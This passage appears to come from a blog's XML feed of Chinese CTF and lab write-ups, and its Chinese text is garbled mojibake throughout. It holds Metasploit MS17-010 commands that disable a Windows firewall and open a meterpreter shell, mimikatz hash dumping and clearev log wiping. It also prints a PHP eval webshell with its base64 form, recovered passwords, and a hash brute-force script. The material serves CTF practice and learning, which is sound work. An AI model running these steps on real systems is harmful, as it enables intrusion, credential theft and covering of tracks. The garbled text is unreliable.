src="http://cdn.polowong.top/static/images/vs16.jpg"><p>ç»å°è¯•åå¯ä»¥pingé€šï¼Œå¯ä»¥é¡ºåˆ©è®¿é—®ã€‚</p><h2 id="æ¸—é€åŸŸå†…æˆå‘˜141"><a href="#æ¸—é€åŸŸå†…æˆå‘˜141" class="headerlink" title="æ¸—é€åŸŸå†…æˆå‘˜141"></a>æ¸—é€åŸŸå†…æˆå‘˜141</h2><p>ä½¿ç”¨nmapå¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æï¼Œå°è¯•æ‰«æSMBæ¼æ´</p><img src="http://cdn.polowong.top/static/images/vs17.jpg"><p>å‘ç°æ¼æ´ï¼Œå°è¯•åˆ©ç”¨</p><img src="http://cdn.polowong.top/static/images/vs18.jpg"><p>æˆåŠŸè·å–ç›®æ ‡æœºå™¨çš„shellã€‚</p><p>load mimikatz</p><p>mimikatz_command -f samdump::hashes è·å–ä¸»æœºçš„å¯†ç ï¼Œè¿™æ ·å°±æˆåŠŸæŠ“åˆ°äº†ä¸»æœºçš„ç”¨æˆ·åå’ŒNTML-hashå€¼ã€‚</p><h2 id="æ¸—é€åŸŸæ§"><a href="#æ¸—é€åŸŸæ§" class="headerlink" title="æ¸—é€åŸŸæ§"></a>æ¸—é€åŸŸæ§</h2><p>ä½¿ç”¨nmapå¯¹ç›®æ ‡ipè¿›è¡Œæ‰«æï¼Œå‘ç°MS17-010å’ŒMS08-067æ¼æ´ï¼Œè¿™æ¬¡å°è¯•åˆ©ç”¨MS17-010è¿›è¡Œæ”»å‡»ã€‚</p><p>é¦–å…ˆå…³é—­é˜²ç«å¢™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è·å¾—ä¸€ä¸ªæ­£å‘shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ç”¨mimikatzæŠ“å¯†ç å‡ºäº†ç‚¹é—®é¢˜ï¼ŒæŠ¥é”™mod_process::getVeryBasicModulesListForProcess : (0x0000012b)</p><p>æœäº†æœè¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºmimikatzé»˜è®¤åŠ è½½32ä½ç³»ç»Ÿï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç³»ç»Ÿæ˜¯64ä½çš„ï¼Œæ‰€ä»¥é¦–å…ˆè¦å°†meterpreterè¿ç§»åˆ°ä¸€ä¸ª64ä½è¿›ç¨‹ä¸Šã€‚</p><p>PSä¸€ä¸‹ï¼Œé€‰æ‹©æƒé™ä¸ºNT AUTHORITY\SYSTEMæƒé™çš„è¿›ç¨‹</p><p>migrate  pid  å³å¯ã€‚</p><p>ä¹‹ååœ¨ç”¨mimikatzæŠ“å¯†ç å°±èƒ½æŠ“åˆ°äº†ã€‚</p><img src="http://cdn.polowong.top/static/images/vs19.jpg"><p>æ”»å‡»ç»“æŸåä½¿ç”¨clearevå‘½ä»¤æ¸…é™¤æ”»å‡»ç—•è¿¹ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç¬¬ä¸€æ¬¡å®Œæ•´åœ°åšå†…ç½‘æ¸—é€ç›¸å…³çš„ç»ƒä¹ ï¼Œå¯¹å†…ç½‘æ¸—é€çš„è¿‡ç¨‹ä¸å¤ªç†Ÿæ‚‰ï¼Œå·¥å…·çš„ä½¿ç”¨ä¹Ÿä¸ç†Ÿæ‚‰ï¼Œå¯¹ä¸€äº›æ¦‚å¿µæ€§çš„åŸºç¡€é—®é¢˜ä¹Ÿä¸å¤ªç†Ÿæ‚‰ã€‚ã€‚ã€‚å¸Œæœ›èƒ½åœ¨åç»­çš„å­¦ä¹ è¿‡ç¨‹ä¸­ä¸æ–­å®Œå–„è¿™äº›æ–¹é¢ã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7">https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7</a></p><p><a href="https://www.freebuf.com/column/230476.html">https://www.freebuf.com/column/230476.html</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14">https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>comprehensive traffic analysis</title>
      <link href="2020/11/30/comprehensive-traffic-analysis/"/>
      <url>2020/11/30/comprehensive-traffic-analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="2019-8-å®‰æ’æµé‡åˆ†æ"><a href="#2019-8-å®‰æ’æµé‡åˆ†æ" class="headerlink" title="2019.8 å®‰æ’æµé‡åˆ†æ"></a>2019.8 å®‰æ’æµé‡åˆ†æ</h2><ol><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œç»™å‡ºé»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°æ˜¯(ç›¸å¯¹è·¯å¾„å³å¯)</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·å¯†ç ç™»é™†äº†webåå°(å½¢å¼:username/password)</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œå¾—åˆ°é»‘å®¢ä¸Šä¼ çš„webshellæ–‡ä»¶åæ˜¯ï¼Œå†…å®¹æ˜¯ä»€ä¹ˆ,æäº¤webshellå†…å®¹çš„baseç¼–ç </li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flagæ˜¯ä»€ä¹ˆ</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç æ˜¯å¤šå°‘</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_codeæ˜¯ä»€ä¹ˆ</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢ç ´è§£äº†è´¦å·<a href="mailto:&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;">&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;</a>å¾—åˆ°çš„å¯†ç æ˜¯ä»€ä¹ˆ</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œè¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ï¼Œç½‘å¡é…ç½®æ˜¯æ˜¯ä»€ä¹ˆï¼Œæäº¤ç½‘å¡å†…ç½‘ip</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢ä½¿ç”¨äº†ä»€ä¹ˆè´¦å·ç™»é™†äº†mailç³»ç»Ÿï¼ˆå½¢å¼: username/passwordï¼‰</li><li>æŸå…¬å¸å†…ç½‘ç½‘ç»œè¢«é»‘å®¢æ¸—é€ï¼Œè¯·åˆ†ææµé‡ï¼Œé»‘å®¢è·å¾—çš„vpnçš„ipæ˜¯å°‘</li></ol><h1 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h1><p>1.è§‚å¯Ÿ12281å·åŒ…ï¼Œçœ‹HTTPå±‚çš„referrerï¼Œå‘ç°äº†AWVSçš„æ‰«æå™¨ç‰¹å¾ã€‚</p><p>2.è¿‡æ»¤httpåè®®ï¼Œå‘ç°/admin/login.php</p><p>3.è¿‡æ»¤httpåè®®ï¼Œçœ‹86å·åŒ…ï¼Œå‘ç°äº†è¡¨å•æ•°æ® username äººäº‹ password hr123456ï¼ˆé”™è¯¯ç­”æ¡ˆï¼‰</p><p>302è·³è½¬ä»£è¡¨ç™»é™†æˆåŠŸ</p><p>ä½¿ç”¨http contains â€œrec=loginâ€ and http.request.method==POST and ip.src==192.168.94.59 è¯­å¥å¯¹weboneè¿›è¡Œè¿‡æ»¤ï¼Œå°†ç»“æœå¯¹æ—¶é—´è¿›è¡Œæ’åºï¼Œå‘ç°æœ€åä¸€ä¸ªåŒ…ä¸­çš„username admin password admin!@#pass123</p><p>4.a.php ç¿»åˆ°æœ€åå‘ç°äº†a.php ç„¶ååˆ†ç»„åˆ—è¡¨æœa.php æ‰¾POSTåŒ…</p><p> Form item: â€œactionâ€ = â€œQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb</p><p>ä½¿ç”¨ http contains â€œ&lt;?php @evalâ€  è¿‡æ»¤æ‰¾ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ã€‚</p><p>è€ƒè™‘TCP é‡ä¼ å¯èƒ½å¯¼è‡´httpæ²¡è¿½è¸ªåˆ°ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨tcp contains â€œ&lt;?php @evalâ€</p><p>å‘ç°äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1234</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å…¶base64encodeå³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>5.æœå­—ç¬¦ä¸²robots.txt å‘ç°flag flag:87b7cb79481f317bde90c116cf36084b</p><p>6.æ‰¾åˆ°webshellçš„åç§°åï¼Œä¸€ç›´è·Ÿè¸ªwebshellï¼Œçœ‹çœ‹å¥¹åœ¨åšä»€ä¹ˆã€‚æ•°æ®åŒ…å¤§æ¦‚åœ¨734581ã€‚</p><p>åé¢ä¼šå‘ç°æŸ¥çœ‹äº†æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå°±å‘ç°äº†æ•°æ®åº“è´¦å·å¯†ç  dbuser web dbpass e667jUPvJjXHvEUv</p><p>7.åœ¨web2æ•°æ®åŒ…ä¸­ è¿‡æ»¤mysqlåè®® åˆ†ç»„å­—èŠ‚æµæœç´¢å­—ç¬¦ä¸²hash_code çœ‹responseåŒ…å‘ç°hash_code d1c029893df40cb0f47bcf8f1c3c17ac</p><p>8.web2æ•°æ®åŒ…ä¸­ è¿‡æ»¤mysqlåè®® æœç´¢å­—ç¬¦ä¸² <a href="mailto:&#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;">&#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;</a> ï¼Œçœ‹åˆ°md5åŠ å¯†çš„å¯†ç b78f5aa6e1606f07def6e839121a22ecï¼Œè§£å¯†ä¸€ä¸‹å¾—åˆ°edc123!@#</p><p>9.è¿½è¸ªwebshellåŒ…ï¼Œå‘ç°äº†ifconfigå‘½ä»¤ã€‚</p><p> -&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  \n</p><p>â€‹          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0\n</p><p>10.æ‰“å¼€mailtwoæ•°æ®åŒ…ï¼Œè¿‡æ»¤httpæµï¼Œå‘ç°ç¬¬ä¸€ä¸ªæ•°æ®åŒ…é‡Œé¢çš„åŠ¨ä½œæ˜¯ç™»å‡ºï¼Œå‘ç°äº†ç”¨æˆ·åwenwenniã€‚</p><p>ç„¶åçœ‹28å·æ•°æ®åŒ…çš„æ“ä½œæ˜¯è®¿é—®ç™»å½•é¡µé¢ï¼Œ35å·æ•°æ®åŒ…å‘ç°äº†å¯†ç åŠ å¯†å‡½æ•°ã€‚</p><p>æ˜¯AES-CBCåŠ å¯†ï¼Œkeyä¸º1234567812345678ã€‚</p><p>ç»§ç»­çœ‹42 44æ•°æ®åŒ…ï¼Œè¿˜æ˜¯wenwenniç”¨æˆ·ç™»å½•ï¼Œå¹¶ä¸”è¿”å›äº† success true.</p><p>å°è¯•ä½¿ç”¨å¦‚ä¸‹è¿‡æ»¤å™¨è¿‡æ»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59</span><br></pre></td></tr></table></figure><p>å‘ç°åˆ°æœ€åä¹Ÿæ²¡çˆ†ç ´æˆåŠŸï¼ˆè¿™é¢˜çœ‹çš„åˆ«äººçš„æ€è·¯ï¼Œæˆ‘æ²¡æ‡‚ï¼‰</p><p>ç„¶åæ‰“å¼€mailto1 ç»§ç»­ä½¿ç”¨ä¸Šè¿°è¯­å¥è¿‡æ»¤</p><p>å‘ç°18512ç™»é™†æˆåŠŸï¼Œåˆ™å¯†ç åœ¨17126å·æ•°æ®åŒ…ä¸­ã€‚+ZgE14UGcFcyRGLI0/ZXPQ==</p><p>å¯†ç ä¸º1234567812345678çš„MD5å€¼ï¼Œåç§»é‡ä¸º1234567812345678</p><p>AESè§£å¯†å¾—admin!@#PASS123</p><p>11.ç¬¬ä¸€ä¸ªvpnæ•°æ®åŒ…åœ¨å°è¯•ç™»å½•vpnï¼Œç„¶åçœ‹ç¬¬äºŒä¸ªã€‚</p><p>ç»Ÿè®¡ä¸€ä¸‹ä¼šè¯ä¿¡æ¯ï¼Œå‘ç°10.3.4.3 10.3.4.96 10.3.4.55 è¿™å‡ ä¸ªipä¹‹é—´çš„é€šä¿¡è¾ƒå¤šï¼Œç„¶åè¿‡æ»¤çœ‹çœ‹ã€‚</p><p>è¿‡æ»¤ä¸€ä¸‹smbåè®®ï¼Œå‘ç°10.3.4.96æ˜¯SMBæœåŠ¡å™¨ã€‚</p><p>ç„¶ååœ¨çœ‹ä¸€ä¸‹55è¿™ä¸ªip</p><p> ip.addr==10.3.4.55  </p><p>å‘ç°10.3.4.3é¦–å…ˆpingäº†10.3.4.55 æ‰€ä»¥ç¡®å®š10.3.4.3æ˜¯é»‘å®¢ä½¿ç”¨çš„vpnæœåŠ¡å™¨ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¯¹ä¸€äº›æœ‰æ‰‹å°±è¡Œçš„è¿‡æ»¤æ–¹æ³•ç”¨çš„è¿˜å¯ä»¥ï¼Œä½†æ˜¯æ·±å…¥ä¸€ç‚¹å°±ä¸å¤ªè¡Œäº† å¯¹ä¸€äº›æµé‡åŠ¨ä½œçš„åˆ†æä¸å¤ªåˆ°ä½ï¼Œå¯¹filterçš„ç”¨æ³•ä¹Ÿä¸å¤ªç†Ÿæ‚‰ï¼Œæ¯”å¦‚\è¡¨è½¬ä¹‰ã€‚ç»§ç»­å­¦ä¹ ï¼</p><h2 id="å¾…å­¦ä¹ ï¼šPPTPåè®®ã€SMBåè®®"><a href="#å¾…å­¦ä¹ ï¼šPPTPåè®®ã€SMBåè®®" class="headerlink" title="å¾…å­¦ä¹ ï¼šPPTPåè®®ã€SMBåè®®"></a>å¾…å­¦ä¹ ï¼šPPTPåè®®ã€SMBåè®®</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_43431158/article/details/107176918">https://blog.csdn.net/qq_43431158/article/details/107176918</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯miscå…¨wp</title>
      <link href="2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/"/>
      <url>2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/</url>
      
        <content type="html"><![CDATA[<h1 id="å¯†ç å­¦-çˆ†ç ´"><a href="#å¯†ç å­¦-çˆ†ç ´" class="headerlink" title="å¯†ç å­¦ çˆ†ç ´"></a>å¯†ç å­¦ çˆ†ç ´</h1><p>SECRETæ˜¯ä¸çŸ¥é“çš„</p><p>flagæ˜¯md5(SECRET).hexdigest()</p><p>å·²çŸ¥éƒ¨åˆ†flagä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125;</span><br></pre></td></tr></table></figure><p>cipheræ˜¯sha256åŠ å¯†åçš„flagï¼Œå…¶æ‘˜è¦ä¸º</p><p>0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a</p><p>ç°åœ¨ä¸çŸ¥é“secretã€‚</p><p>str1=â€71b2b5616â€</p><p>str2=â€2a4639â€</p><p>str3=â€7d979â€</p><p>str4=â€de964câ€</p><p>str1 2 3 4 ä¹‹é—´åˆ†åˆ«æœ‰ä¸¤ä½ä¸çŸ¥é“ çˆ†ç ´çš„è¯éœ€è¦çˆ†ç ´16^6æ¬¡ã€‚</p><p>ç›´æ¥çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line">broken_flag= <span class="string">&#x27;71b2b5616**2a4639**7d979**de964c&#x27;</span></span><br><span class="line">str1=<span class="string">&quot;d0g3&#123;71b2b5616&quot;</span></span><br><span class="line">str2=<span class="string">&quot;2a4639&quot;</span></span><br><span class="line">str3=<span class="string">&quot;7d979&quot;</span></span><br><span class="line">str4=<span class="string">&quot;de964c&#125;&quot;</span></span><br><span class="line">cipher=<span class="string">&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdigest</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span>  hashlib.sha256(content).hexdigest()</span><br><span class="line">alphabet=<span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> alphabet:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> alphabet:</span><br><span class="line">                        string=str1+a+b+str2+c+d+str3+e+f+str4</span><br><span class="line">                        <span class="keyword">if</span> getdigest(string)==cipher:</span><br><span class="line">                            <span class="built_in">print</span> string</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>æ‰«ç å¥—å¨ƒï¼Œç„¶åå¾—åˆ°ä¸€ä¸ªflag.docxï¼Œé‡Œé¢ä¸€ä¸²ä¹±ç ï¼Œè€Œä¸”å…¬ä¼—å·ä¹Ÿæç¤ºäº†ä¸æ˜¯emojidecodeï¼Œä½†æ˜¯è¿™ç©æ„é™¤äº†emojidecodeè¿˜èƒ½æ˜¯å•¥ï¼Ÿ</p><p>å› ä¸ºæˆ‘çš„word2016æ— æ³•æ˜¾ç¤ºemojiï¼Œç„¶åæˆ‘æ¢æˆrarè§£å‹ï¼Œåœ¨xmlé‡Œé¢çœ‹åˆ°äº†emojiï¼Œæ”¾åˆ°åœ¨çº¿è§£å¯†å·¥å…·å³å¯ã€‚ï¼ˆå¸ˆå‚…ä»¬ç›´æ¥å¤åˆ¶è¿‡å»å°±å®Œäº‹äº†ï¼‰</p><h2 id="ç‹ç‰Œç‰¹å·¥"><a href="#ç‹ç‰Œç‰¹å·¥" class="headerlink" title="ç‹ç‰Œç‰¹å·¥"></a>ç‹ç‰Œç‰¹å·¥</h2><p>è¿™é“é¢˜ä¸€å¼€å§‹æ²¡å•¥æ€è·¯ï¼Œç„¶åfileçœ‹ä¸€ä¸‹æ˜¯ext3æ ¼å¼ã€‚ç½‘ä¸Šæœäº†ä¸€ç¯‡æ•™ç¨‹å°±å·®ä¸å¤šå‡ºæ¥äº†ã€‚</p><p><a href="https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/">https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/</a></p><p>å·¥å…·ï¼šfsstatï¼Œext3grepï¼Œveracryptã€‚</p><p>è£…ext3grepçš„æ—¶å€™ï¼ŒæŠ¥é”™äº†æŒ‰ç…§ç½‘ä¸Šè¯´çš„åšå¢æ·»ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘è¿™è¿˜ä¼šæŠ¥é”™ï¼ŒæŠŠæœ€åæŠ¥é”™çš„é‚£ä¸€è¡Œæ³¨é‡Šæ‰å°±å®Œäº‹å„¿äº†ã€‚</p><p>é¦–å…ˆä½¿ç”¨fsstatçœ‹é•œåƒä¿¡æ¯ã€‚</p><p>fsstat findme</p><p>å…¶ä¸­root directoryæ¯”è¾ƒé‡è¦ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰</p><p>æ¥ä¸‹æ¥ä½¿ç”¨ext3grepæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ã€‚</p><p>ext3grep â€“inode 2 findme</p><img src="http://cdn.polowong.top/static/images/misc2.png"><p>æ¢å¤è¿™ä¸ªä¸œè¥¿</p><p>ext3grep â€“restore-file .coolboy.swp findme </p><p>vim -r .coolboy.swp</p><p>æ–°å»ºä¸€ä¸ªç›®å½•/root/coolboy æ¢å¤å®Œä¼šæ”¾åˆ°è¿™é‡Œé¢ï¼Œbase64è§£ç åçš„å†…å®¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœŸçš„å¯†ç :this_is_a_true_key</span><br></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªå¯†ç ä½¿ç”¨veracryptå»æŒ‚è½½flagboxï¼Œå°±å¯ä»¥è·å¾—flagã€‚</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>ä¸€å¼€å§‹æ˜¯hardzipï¼Œæœ‰ä¸ªå¯†ç 1ï¼Œçœ‹æ–‡ä»¶æ¯”è¾ƒçŸ­å°è¯•CRC32çˆ†ç ´ï¼Œçˆ†ç ´å®Œçš„å¯†ç æ‹¼èµ·æ¥å°±æ˜¯easyzipçš„è§£å‹å¯†ç ã€‚</p><p>è§£å‹ä¸‹æ¥easyzipï¼Œ</p><p>é€šè¿‡ä¼ªåŠ å¯†æ‹¿åˆ°redeme.txtï¼Œå°è¯•æ˜æ–‡æ”»å‡»ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨æ˜æ–‡æ”»å‡»éœ€è¦ä¿è¯å¾…ç ´è§£å‹ç¼©åŒ…é‡Œåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å·²çŸ¥æ–‡ä»¶ã€‚å› ä¸ºè¿™é‡Œé¢æœ‰ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œå…¶ä»–æ–‡ä»¶çš„å‹ç¼©ç®—æ³•å¯èƒ½ä¸å·²çŸ¥æ–‡ä»¶çš„ä¸ä¸€è‡´ï¼Œæ‰€ä»¥ä¸ºäº†ä¿è¯é¡ºåˆ©è¿›è¡Œï¼Œéœ€è¦å°†å…¶ä»–æ–‡ä»¶åˆ é™¤ï¼ˆè¿™é“é¢˜æ‰€éœ€è¦ï¼Œå…¶ä»–æƒ…å†µä¸‹å¦‚æœåŠ å¯†æ–¹å¼éƒ½ä¸€æ ·çš„è¯å°±ä¸ç”¨åˆ é™¤ã€‚ï¼‰</p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>npmtxtæ‰“å¼€ä¸€çœ‹å•¥ä¹Ÿä¸æ‡‚ï¼Œ010editoræ‰“å¼€ä¸€çœ‹æœ‰çœ‹ä¸æ‡‚çš„ä¸œè¥¿ï¼Œæœäº†æœ16è¿›åˆ¶æ…¢æ…¢æœå°±æœåˆ°äº†0å®½éšå†™ã€‚</p><p>æŠŠé‚£ä¸€ä¸²å¤åˆ¶åˆ°<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a> </p><p>decodeå°±å¯ä»¥è·å¾—è§£å‹å¯†ç </p><p>RealV1siBle</p><img src="http://cdn.polowong.top/static/images/misc4.png"><p>æ‰“å¼€æ˜¯å¼ å›¾ï¼Œsilenteyeä¸€æŠŠæ¢­å‡ºæ¥flagã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡æ¯”èµ›è§‰å¾—webæ¯”è¾ƒéš¾ï¼Œsstiæ²¡åšå‡ºæ¥æ¯”è¾ƒä¸Šå¿ƒã€‚æœ€è¿‘æ‰“ç®—æ·±åº¦å­¦ä¹ sstiç›¸å…³å†…å®¹ï¼Œäº‰å–ä¸‹æ¬¡åšå‡ºæ¥ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å±±ä¸œçœæ–°ä¸€ä»£æ”»é˜²èµ›wp</title>
      <link href="2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/"/>
      <url>2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/</url>
      
